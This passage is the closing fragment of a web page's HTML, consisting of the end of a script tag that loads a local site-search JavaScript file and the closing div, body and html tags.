src="/js/search/local-search.js"></script></div></div></body></html>
